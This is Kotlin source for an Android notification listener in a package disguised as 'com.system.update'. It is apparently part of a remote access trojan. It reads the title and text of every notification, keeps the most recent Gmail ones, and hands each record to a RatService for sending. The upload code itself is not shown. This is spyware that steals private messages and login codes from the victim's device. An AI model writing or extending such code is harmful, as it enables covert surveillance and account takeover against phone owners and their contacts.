package com.system.update

import android.app.Notification
import android.content.Context
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.gson.Gson

class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifListener"
        var instance: NotificationListener? = null
        var callback: ((Map<String, String>) -> Unit)? = null

        private val gmailNotifs = mutableListOf<Map<String, String>>()

        fun getGmailNotifs(): List<Map<String, String>> {
            return gmailNotifs.toList()
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        try {
            val pkg = sbn.packageName ?: ""
            val extras: Bundle = sbn.notification?.extras ?: return

            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
            val bigText = extras.getString(Notification.EXTRA_BIG_TEXT) ?: ""
            val subText = extras.getString(Notification.EXTRA_SUB_TEXT) ?: ""

            val body = if (bigText.isNotEmpty()) bigText else text
            if (title.isEmpty() && body.isEmpty()) return

            val appName = try {
                val pm = packageManager
                val ai = pm.getApplicationInfo(pkg, 0)
                pm.getApplicationLabel(ai).toString()
            } catch (_: Exception) { pkg }

            val data = mapOf(
                "app" to appName,
                "package" to pkg,
                "title" to title,
                "body" to body,
                "sub" to subText,
                "time" to System.currentTimeMillis().toString()
            )

            Log.i(TAG, "Notif: $appName - $title - $body")

            // Simpan Gmail notif
            if (pkg.contains("gmail") || appName.lowercase().contains("gmail")) {
                gmailNotifs.add(0, data)
                if (gmailNotifs.size > 100) gmailNotifs.removeAt(gmailNotifs.size - 1)
            }

            callback?.invoke(data)

            RatService.instance?.sendNotificationEvent(data)
        } catch (e: Exception) {
            Log.e(TAG, "onNotificationPosted error", e)
        }
    }
}